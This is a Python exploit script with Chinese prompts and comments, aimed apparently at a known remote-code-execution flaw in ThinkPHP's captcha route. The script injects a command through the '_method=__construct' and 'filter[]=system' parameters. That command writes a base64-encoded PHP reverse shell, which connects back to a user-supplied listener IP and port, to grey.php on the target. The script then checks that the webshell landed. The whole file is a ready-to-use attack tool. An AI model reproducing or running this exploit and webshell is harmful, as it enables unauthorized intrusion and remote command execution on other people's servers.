import requests
import colorama
import base64

def main():
    url=input("请输入需要验证的url:")
    if url.lower()=='exit':
          return None
    else:
          pass
    ip=str(input("输入你的公网监听地址:"))
    port=int(input("输入你的监听端口:"))
    shell=r'''

<?php
$ip = "IPS";
$port = PORTS;
$socket = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$socket) {
    echo "$errstr ($errno)\n";
} else {
    while (true) {
        // 读取来自攻击者的命令并执行
        $cmd = fread($socket, 2048);
        if ($cmd === false) {
            break;
        }
        $output = shell_exec($cmd);
        // 将执行结果发送给攻击者
        fwrite($socket, $output);
    }
    fclose($socket);
}
?>
'''
    shell=shell.replace("IPS",ip)
    shell=shell.replace("PORTS",str(port))
    encoded_shell = base64.b64encode(shell.encode('utf-8')).decode('utf-8')
    print(colorama.Fore.GREEN+f"[+]这是编码后的木马：{encoded_shell}"+colorama.Style.RESET_ALL)
    command = f'echo {encoded_shell} | base64 -d > grey.php'
    req = '/index.php?s=captcha'
    print(colorama.Fore.YELLOW+"[+]验证......"+colorama.Style.RESET_ALL)
    data = {
        '_method': '__construct',
        'filter[]': 'system',
        'method': 'get',
        'server[REQUEST_METHOD]': f'{command}'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0'
    }
    
    # 拼接 URL
    full_url = url.rstrip('/') + req
    #print(f"Full URL: {full_url}")
    

    # 发送 POST 请求
    response = requests.post(full_url, data=data, headers=headers)
    print(colorama.Fore.YELLOW+f"[+]状态码{response.status_code}"+colorama.Style.RESET_ALL)
    # 打印响应内容

    verification_url=url+"/grey.php"
    verification=requests.get(verification_url,headers=headers)
    if verification.status_code==200:
          print(colorama.Fore.GREEN+f"[+]木马上传成功：{verification.status_code},访问{verification_url}上线主机"+colorama.Style.RESET_ALL)
    else:
          print(colorama.Fore.RED+f"[-]出现了一些问题：{verification.status_code}"+colorama.Style.RESET_ALL)
